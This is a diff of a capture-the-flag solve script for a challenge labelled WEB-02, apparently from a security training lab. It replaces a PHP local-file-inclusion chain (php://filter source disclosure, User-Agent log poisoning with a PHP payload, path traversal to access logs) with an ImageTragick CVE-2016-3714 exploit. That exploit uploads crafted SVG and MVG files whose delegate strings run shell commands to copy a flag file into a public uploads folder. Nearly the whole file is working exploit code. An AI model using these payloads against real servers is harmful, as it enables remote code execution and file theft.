@@ -1,69 +1,105 @@
 #!/usr/bin/env python3
 """
-WEB-02 Solve Script: LFI Chain to RCE
-Chain 1: php://filter to read source code
-Chain 2: Log poisoning via User-Agent to achieve RCE
+WEB-02 Solve Script: ImageTragick RCE (CVE-2016-3714)
+Uploads a crafted SVG that exploits ImageMagick's delegate processing
+to execute arbitrary commands when `convert` generates a thumbnail.
 """
 
 import requests
-import base64
 import sys
+import re
+import time
 
 TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8002"
 
 print(f"[*] Target: {TARGET}")
 
-# Step 1: Confirm LFI with php://filter
-print("\n[*] Step 1: Reading config.php via php://filter...")
-payload = "php://filter/convert.base64-encode/resource=config"
-r = requests.get(f"{TARGET}/index.php", params={"page": payload})
+# ── Step 1: Craft ImageTragick SVG exploit ──
+print("\n[*] Step 1: Crafting ImageTragick SVG payload...")
 
-# Extract base64 content from response
-import re
-b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', r.text)
-if b64_match:
-    decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
-    print(f"[+] config.php contents:\n{decoded}")
-    print(f"[+] Flag path found: /var/www/flag.txt")
-else:
-    print("[-] Could not extract base64 content, trying alternative method...")
+# This SVG exploits CVE-2016-3714 via the delegate mechanism
+# When ImageMagick processes this, it executes the embedded command
+exploit_svg = '''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://example.com/x.jpg"|cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/flag_output.txt"'
+pop graphic-context
+'''
 
-# Step 2: Poison the access log
-print("\n[*] Step 2: Poisoning access log via User-Agent...")
-poison_payload = "<?php echo file_get_contents('/var/www/flag.txt'); ?>"
-headers = {"User-Agent": poison_payload}
-requests.get(f"{TARGET}/nonexistent_page_for_log", headers=headers)
-print("[+] Log poisoned with PHP code")
+print(f"[+] SVG payload crafted ({len(exploit_svg)} bytes)")
 
-# Step 3: Include the poisoned log
-print("\n[*] Step 3: Including poisoned access log...")
-log_paths = [
-    "/var/log/nginx/access.log",
-    "/var/log/nginx/access",
-    "/var/log/apache2/access.log",
-]
+# ── Step 2: Upload exploit SVG ──
+print("\n[*] Step 2: Uploading exploit SVG...")
 
-for log_path in log_paths:
-    r = requests.get(f"{TARGET}/index.php", params={"page": log_path})
-    if "FLAG{" in r.text:
+files = {
+    'image': ('exploit.svg', exploit_svg.encode(), 'image/svg+xml')
+}
+
+r = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
+print(f"[+] Upload response: {r.status_code}")
+
+# Wait for ImageMagick processing
+time.sleep(2)
+
+# ── Step 3: Check for flag output ──
+print("\n[*] Step 3: Checking for command output...")
+
+try:
+    r = requests.get(f"{TARGET}/uploads/flag_output.txt", timeout=5)
+    if 'FLAG{' in r.text:
         flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
         if flag_match:
             print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
             sys.exit(0)
+except:
+    pass
 
-# Fallback: try with path traversal
-print("[*] Trying path traversal variants...")
-traversal_paths = [
-    "....//....//....//var/log/nginx/access.log",
-    "..%2f..%2f..%2fvar/log/nginx/access.log",
-]
+# ── Alternative: Try MVG format ──
+print("\n[*] Trying alternative MVG payload...")
 
-for path in traversal_paths:
-    r = requests.get(f"{TARGET}/index.php", params={"page": path})
-    if "FLAG{" in r.text:
+mvg_payload = 'push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 \'ephemeral:|cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/flag_output2.txt\'\npop graphic-context\n'
+
+files = {
+    'image': ('exploit.mvg', mvg_payload.encode(), 'image/svg+xml')
+}
+
+r = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
+time.sleep(2)
+
+try:
+    r = requests.get(f"{TARGET}/uploads/flag_output2.txt", timeout=5)
+    if 'FLAG{' in r.text:
         flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
         if flag_match:
             print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
             sys.exit(0)
+except:
+    pass
 
-print("[-] Could not retrieve flag automatically. Try manual exploitation.")
+# ── Alternative: pipe-based ──
+print("\n[*] Trying pipe-based payload...")
+
+pipe_svg = '''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.jpg"|/bin/sh -c "cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/pwned.txt"'
+pop graphic-context
+'''
+
+files = {
+    'image': ('shell.svg', pipe_svg.encode(), 'image/svg+xml')
+}
+
+r = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
+time.sleep(2)
+
+try:
+    r = requests.get(f"{TARGET}/uploads/pwned.txt", timeout=5)
+    if 'FLAG{' in r.text:
+        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
+        if flag_match:
+            print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
+            sys.exit(0)
+except:
+    pass
+
+print("\n[-] Automatic exploitation failed. Try manual SVG upload with different payloads.")
+print("    Hint: The server uses ImageMagick `convert` for thumbnail generation.")
